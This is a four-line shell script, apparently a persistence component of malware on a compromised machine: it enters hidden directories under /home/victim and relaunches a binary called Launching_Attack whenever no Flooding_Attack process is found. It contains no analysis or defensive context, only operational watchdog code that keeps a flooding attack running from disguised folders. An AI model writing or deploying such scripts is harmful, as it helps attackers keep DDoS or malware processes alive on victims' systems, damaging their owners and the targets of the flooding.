cd /home/victim/.sys/.preference
if [ $(ps aux | grep Flooding_Attack | wc -l) -lt 2 ]; then ./Launching_Attack; fi
cd /home/victim/.etc/.module
if [ $(ps aux | grep Flooding_Attack | wc -l) -lt 2 ]; then ./Launching_Attack; fi
